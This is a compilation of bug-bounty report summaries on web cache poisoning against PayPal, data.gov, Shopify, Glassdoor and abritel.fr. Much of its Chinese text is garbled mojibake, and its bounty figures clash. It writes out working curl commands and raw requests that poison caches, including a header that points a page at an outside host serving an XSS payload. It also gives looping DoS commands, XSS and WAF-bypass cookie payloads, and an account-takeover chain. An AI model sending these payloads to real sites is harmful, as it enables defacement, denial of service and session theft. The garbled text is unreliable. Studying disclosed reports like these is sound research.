# ç¼“å­˜ä¸­æ¯’

## [DoS on PayPal via web cache poisoning](https://hackerone.com/reports/622122)
### Summary
On [https://paypal.com/](https://paypal.com/), you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from [www.paypalobjects.com](http://www.paypalobjects.com/) with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty.

### Steps
1. æ’ä»¶æœç´¢
2. Transfer-Encodingå¤´ä¼šå¯¼è‡´501 Not Implementedâ€æ›¿æ¢www.paypalobjects.comä¸­çš„å…³é”®JavaScriptæ–‡ä»¶æ¥ç ´åæ ¸å¿ƒåŠŸèƒ½

### Impact
1. DOS
2. 9500$ðŸ’µ


## [Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS](https://hackerone.com/reports/303730)
### Summary
æ ¹æœ¬é—®é¢˜æ˜¯æœåŠ¡å™¨ä¿¡ä»»X-Forwarded-Host HTTPå¤´ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥å¡«å……bodyæ ‡è®°ä¸Šçš„â€œdata-site-rootâ€å’Œâ€œdata-locale-rootâ€å±žæ€§ã€‚ç„¶åŽï¼ŒæŸäº›JavaScriptä»Žè¿™äº›å±žæ€§ä¸­æŒ‡å®šçš„URLèŽ·å–JSONæ–‡ä»¶ï¼Œå¹¶å°†å“åº”å†™å…¥é¡µé¢è€Œä¸å¯¹å…¶è¿›è¡Œè½¬ä¹‰ï¼Œä»Žè€Œå¯¼è‡´DOMXSSæ¼æ´žã€‚

### Step
1. curlæ ¼å¼
```code
curl -i -s -k -X $'GET' \
-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```
2. http rawæ ¼å¼
```code
GET /dataset/consumer-complaint-database?dontpoisoneveryone=6 HTTP/1.1
Host: catalog.data.gov
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?
Connection: close


```
3. è®¿é—®ä¸­æ¯’é¡µé¢ï¼šhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6 å¼¹çª—
### Impact
750$ðŸ’µ

## [https://themes.shopify.com Host header web cache poisoning lead to DoS](https://hackerone.com/reports/1096609)
### Summary
Poison your cache with HTTP header Host header with arbitrary PORT which is not opened. This attack may lead to Denial of Services

### Steps
1. `while true; do curl -ik "[https://themes.shopify.com:443/?g4mm4=hitthecache"](https://themes.shopify.com/?g4mm4=hitthecache%22)Â -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done`
2. `while true; do curl -ik "[https://themes.shopify.com:443/"|grep](https://themes.shopify.com/%22%7Cgrep)Â ":1337"; done`

### Impact
$2,900ðŸ’µ

## [Web Cache Poisoning leads to XSS and DoS](https://hackerone.com/reports/1621540)
### Summary
åˆ©ç”¨URLè§£æžå™¨æ··æ·†ä¸Žhttps://glassdoor.com/Job/å’Œhttps://glassdoor.com/mz-survey/interview/collectQuestions_input.htm/ ä¸‹çš„åå°„XSSç›¸ç»“åˆï¼Œé€šè¿‡cookieå’Œå¤´å‚æ•°å°†XSSæœ‰æ•ˆè½½è·ç¼“å­˜åˆ°/URL/Award/å’Œ/List/ endpointsã€‚
ä¸Šè¿°ç»„åˆå…è®¸å°†è‡ªåå°„çš„XSSè½¬æ¢ä¸ºå­˜å‚¨çš„XSSï¼Œè¯¥å­˜å‚¨çš„XSSåœ¨å¤§çº¦10åˆ†é’Ÿçš„æŒç»­æ—¶é—´å†…è¢«ç¼“å­˜åˆ°æœ¬åœ°CDNã€‚
ä¸ºäº†å½±å“æ‰€æœ‰ç”¨æˆ·ï¼Œç ”ç©¶äººå‘˜æŒ‡å‡ºï¼Œä»–ä»¬ç†è®ºä¸Šå¯ä»¥é’ˆå¯¹æ‰€æœ‰CDNï¼Œæ¯10åˆ†é’Ÿå¾ªçŽ¯ä¸€æ¬¡ï¼Œä»¥ä¿æŒè¯¥é«˜é€Ÿç¼“å­˜åŠ è½½å­˜å‚¨çš„XSSã€‚

### [Steps](https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html)
1. httpå¤´+cookie æž„æˆåå°„æ€§xss
```javascript
X-Forwarded-For: VULN
X-Forwarded-For: VULN><svg/onload=self[`alert`](document.domain)>
Cookie: gdId=VULN%22</script%20
```
2. åˆ©ç”¨webç¼“å­˜ å°†åå°„æ€§xsså˜ä¸ºå­˜å‚¨åž‹xss

## [Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)](https://hackerone.com/reports/1760213)
### Summary
I was able to Takeover Accounts Via Cache Poisoning (XSS)

This was possible due to 4 issues:

1. `hav` cookie was reflected in the Response on https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js
```javascript
var hav="value from cookie"
```

2. The server had a protection where it was "Hiding" double quotes, however the server was not doing that with greater than and less than symbols (<>) which allowed me to closed the script tag and using that double quotes protection I was able to Bypass the WAF easily

WAF would trigger when:

```http
Cookie: hav=xss"</script><svg/onload=alert(document.domain)>
```
---

But using double quotes I was able to bypass the WAF:

```http
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
```

Which reflected in the response as:

```html
var hav="xss</script><svg/onload=alert(document.domain)>"
```


3. The Server sees https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js as a "cacheable" response, therefore the reflected value in the cookie was saved in that Page, any user who visited https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js would get XSSed

4. Session cookie was HTTPonly Flagged, however, In this same page where the XSS was, there was a JS Variable called `window.INITIAL_STATE.system.cookie`  where the session was located in clear text

### Steps
1. Send this request
```javascript
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```
2. Using another browser visit:
https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd

### Impact
Stored XSS to Account Takeover